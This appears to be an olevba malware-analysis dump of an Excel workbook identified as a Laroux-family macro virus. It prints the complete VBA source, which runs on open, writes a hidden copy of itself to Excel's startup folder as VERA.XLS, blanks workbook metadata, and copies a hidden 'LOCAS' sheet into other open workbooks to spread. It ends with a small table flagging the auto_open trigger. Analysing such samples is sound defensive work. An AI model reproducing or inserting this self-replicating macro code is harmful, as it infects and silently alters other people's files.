olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-b7f1d62075ecae153b833754c2a9640843c6b188
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Locas.bas 
in file: Virus.MSExcel.Laroux-based-b7f1d62075ecae153b833754c2a9640843c6b188 - OLE stream: '_VBA_PROJECT_CUR/VBA/Locas'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


























Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "VERA.XLS")
    If m$ = "VERA.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("locas").Visible = True
    Sheets("locas").Select
    Sheets("locas").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "VERA.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("LOCAS").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "VERA.xls!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "LOCAS" Then
        Workbooks("VERA.XLS").Sheets("LOCAS").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("LOCAS").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "VERA.xls!check_files"
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Loca
' 0085     11 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  FP
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  FPP Academi
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  MOL
' 0085     21 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  MOLP Academi
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
+----------+--------------------+---------------------------------------------+

